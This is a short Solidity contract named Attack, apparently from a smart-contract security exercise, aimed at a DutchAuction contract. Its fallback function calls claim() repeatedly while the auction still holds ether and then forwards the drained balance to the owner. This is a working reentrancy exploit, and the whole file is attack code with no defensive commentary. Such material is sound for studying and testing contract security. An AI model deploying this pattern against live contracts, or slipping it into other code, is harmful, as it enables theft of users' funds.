// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../DutchAuction.sol";

contract Attack {
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    address owner;
    DutchAuction da;

    constructor(address dutchAuctionAddress) {
        da = DutchAuction(dutchAuctionAddress);
        owner = msg.sender;
    }

    function buy() external payable {
        da.buy{value: 0.01 ether}();
    }

    function attack() external payable onlyOwner {
        da.claim();
    }

    receive() external payable {
        console.log("receive");
    }

    fallback() external payable {
        console.log("-------receive-------");
        if (address(da).balance > 0) {
            console.log("Claiming again");
            da.claim();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}
